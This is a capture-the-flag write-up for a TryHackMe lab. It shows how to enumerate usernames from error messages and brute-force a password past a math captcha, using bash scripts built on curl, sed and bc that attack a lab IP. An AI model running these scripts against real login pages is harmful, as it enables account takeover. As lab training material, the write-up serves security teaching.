
# THM - Capture! writeup

Link : https://tryhackme.com/room/capture

## First step: discovery
We have a website to hack, with a quick introduction: there is no WAF but an homemade mechanism...

We download a zip archive with usernames and passwords. Easy - _too easy_ ?

Let's open the website: a simple basic login page. But when we try a few random logins, we get a captcha !

The captcha itself is easy to crack. It's a simple math operation. **But**
- there is no cookie, no session, no hidden field in the form
- and the captcha is actually really checked. If we type a wrong value, we get an "Invalid captcha" - instead of "user does not exist"

--> It would be logical to say that captcha is handled _server-side_. Each HTTP response generates a captcha and expects the next HTTP request to provide the right answer.

Said differently: we shall not use parallel requests - so no Hydra, no ffuf (unless we properly configure them).

Anyway, let's do it manually !

## Second step: get username
There is an information disclosure issue in the error message. It says "user does not exist".
So... if the user exists, we may have a different error message (like "Invalid password", maybe).

Solving the captch is not an issue. We notice that the question lies on line 97 of all HTTP responses. Let's use some command line tools like
- sed, to get the question
- bc, to get the answer

The following get_username.sh script will iterate on all usernames and halt on the 

```
#!/bin/bash
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse


for i in $(cat usernames.txt); do
        # Get captcha answer from last HTTP responsei, line 97
        # (use bc to get the result)
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)

        # username cleansing - too lazy to set IFS
        user=$(echo $i|sed 's/[^a-z]//g')

        # new attempt
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=test&captcha=$captcha" \
          > lastresponse

        # check if last response is different
        cat lastresponse | sed -n '105p' | grep -v "does not exist" \
         && echo $user && break
done
```

Let's explain this a little bit
- We execute curl to get the first "last response"
- For each username
- - We get the captcha from last response
- - We sanitize username (I'm too lazy to set the correct IFS...)
- - We execute a curl to test username, this will be our new "last response"
- - If there is no message "does not exist" on line 105, we get our username !

Let's go !!

```
┌──(root㉿kali)-[~/Downloads]
└─# ./get_username.sh
    <p class="error"><strong>Error:</strong> Invalid password for user &#39;xxxREDACTEDxxx&#39;
xxxREDACTEDxxx
```

Now, let's find the password.

## Third step: get password
We'll do exactly the same. To halt, let's be a bit more tricky: if the password is right, we won't have any captcha in the response, right ? So the next issue won't be "Invalid password", but "Invalid captcha".

The get_password.sh script accepts one parameter (username), and iterates over all passwords to get the correct one.

```
#!/bin/bash
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse

previous=
for i in $(cat passwords.txt); do
        # Get captcha ...
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
        # Too lazy again...
        password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$1&password=$password&captcha=$captcha" \
          > lastresponse
        cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
          && echo $previous && break
        previous=$password
done
```

Let's go (again) !!!

```
┌──(root㉿kali)-[~/Downloads]
└─# ./get_password.sh xxxREDACTED_USERxxx
    <p class="error"><strong>Error:</strong> Invalid captcha
xxxREDACTED_PASSWORDxxx
```

## Last step: get the flag
Just connect with username and password we found, that's all.

Bonus: this scripts automates the whole process:
```

#!/bin/bash
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse

for i in $(cat usernames.txt); do
        # Get captcha answer from last HTTP responsei, line 97
        # (use bc to get the result)
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)

        # username cleansing - too lazy to set IFS
        user=$(echo $i|sed 's/[^a-z]//g')

        # new attempt
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=test&captcha=$captcha" \
          > lastresponse

        # check if last response is different
        cat lastresponse | sed -n '105p' | grep -v "does not exist" \
        > /dev/null && break
done

echo Found username: $user

previous=
for i in $(cat passwords.txt); do
        # Get captcha ...
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
        # Too lazy again...
        password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=$password&captcha=$captcha" \
          > lastresponse
        cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
         > /dev/null && break
        previous=$password
done

echo Found password: $previous

captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw "username=$user&password=$previous&captcha=$captcha" \
  | sed 's/<[^>]*>//g'
```


Et voilà !
